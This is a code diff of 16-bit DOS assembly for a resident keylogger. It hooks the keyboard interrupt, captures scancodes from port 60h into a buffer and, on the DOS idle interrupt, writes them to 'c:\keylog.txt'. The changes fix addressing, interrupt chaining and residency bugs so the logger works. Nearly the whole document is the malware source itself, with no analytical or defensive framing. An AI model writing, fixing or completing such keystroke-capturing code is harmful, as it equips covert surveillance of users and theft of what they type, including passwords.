@@ -5,39 +5,38 @@ org 100h
 locals @@
 
 Start:
-
 		cli
 
 	;counting addr of int 9h
-		mov dx, 9h * 4h 
+		mov bx, 9h * 4h 
 		xor ax, ax
 		mov es, ax
 
 
 	;saving addr of old 9h
-		mov ax, word ptr es:[dx]  		
+		mov ax, word ptr es:[bx]  		
 		mov word ptr old_9h_o, ax 		;offset
 		
-		mov ax, word ptr es:[dx + 2]
+		mov ax, word ptr es:[bx + 2]
 		mov word ptr old_9h_s, ax  		;segment
 
 
 	;rewriting addr of old 9h to new 9h in memory
-		mov ax, 2509h					
+		mov ax, 2509h	
 		mov dx, offset new_9h
 		int 21h
 
 
 	;counting addr of int 28h
-		mov dx, 28h * 4h 
+		mov bx, 28h * 4h 
 		xor ax, ax
-		mov ds, ax
+		mov es, ax
 
 	;saving addr of old 28h
-		mov ax, word ptr es:[dx]
+		mov ax, word ptr es:[bx]
 		mov word ptr old_28h_o, ax
 
-		mov ax, word ptr es:[dx + 2d]
+		mov ax, word ptr es:[bx + 2]
 		mov word ptr old_28h_s, ax
 
 
@@ -45,88 +44,95 @@ Start:
 		mov ax, 2528h
 		mov dx, offset new_28h
 		int 21h
-
-
+	
 		sti
-
 
 	;staying resident in memory
 		mov ax, 3100h;
+		mov dx, offset end_label
+		shr dx, 4
+		inc dx
 		int 21h;
 
 
 new_28h proc
-		pushf
 		pusha
-		
-		call flush_buff
+		push es ds
 
+		call flush_buff 
+
+		pop ds es
 		popa
-		popf
 
-		db 0eah
-		old_28h_o dw ?
-		old_28h_s dw ?
+	;call original int 28h
+		pushf
+		call dword ptr cs:[old_28h_o]
+		iret
 
 		endp
+
+old_28h_o dw 0h
+old_28h_s dw 0h
 
 
 new_9h proc
-		pushf
 		pusha
+		push es ds
 
 		call read_to_buff	
-
+		
+		pop ds es
 		popa
-		popf
 
 	;call original int 9h
-		db 0eah;
-		old_9h_o dw ?
-		old_9h_s dw ?
-	
-	;;returning to the original function
-	;;	jmp dword ptr cs:[old_9h_o]
+		pushf
+		call dword ptr cs:[old_9h_o]
+		iret
 
 		endp
 		
 
-proc read_to_buff
+old_9h_o dw 0h
+old_9h_s dw 0h
 
-		pusha
+		
 
+read_to_buff proc 
+	
+	mov ah, 02h
+	mov dl, 92d
+	int 21h
 
 	;saving pressed key
 		in al, 60h;	
-
-	;setting dx as head
-		mov dx, offset buff 
-		add dx, buff_head
 	
-	;setting bx as tail
-		mov bx, offset buff 	
-		add bx, buff_tail
+	;setting bl as tail
+		xor bh, bh
+		mov bl, buff_tail
 	
 	;writing pressed key to the buffer
-		mov cs:[bx], al
+		mov di, offset buff
+		add di, bx 
+
+		mov cs:[di], al
 	
 	;adjusting tail
-		inc dx
-		mov cs:[buff_tail], dl
+		inc bl
+		mov byte ptr buff_tail, bl 
 
 	;skipping key release
 		in al, 60h;
 		xor al, al	
 
-		popa
-
 		ret
 		endp
 
 
-proc flush_buff
+flush_buff proc 
 
-		pusha   ;saving regs
+;		mov ah, 02h
+;		mov dl, 70d
+;		int 21h
 	
 	;opening file by adress in ds:dx and saving its handler  
 		mov ax, 3d02h; 
@@ -153,10 +159,10 @@ proc flush_buff
 
 
 	;counting num of symbols to write
-		push dl
+		push dx
 		sub dl, bl
 		mov cl, dl
-		pop dl
+		pop dx
 
 	;writing symbols to file
 		push bx
@@ -180,18 +186,17 @@ proc flush_buff
 		int 21h
 
 
-		popa    ;fixing regs
-
 		ret
 		endp
 
-log_file: db 'c:\keylog.txt', 0
-file_handler: db ?
+log_file db 'c:\keylog.txt', 0
+file_handler dw ?
 
 
-buff: db 256 dup (?)
-buff_head: db 0 
-buff_tail: db 0
+buff db 256 dup (?)
+buff_head db 0 
+buff_tail db 0
+
 
 end_label:
 end Start
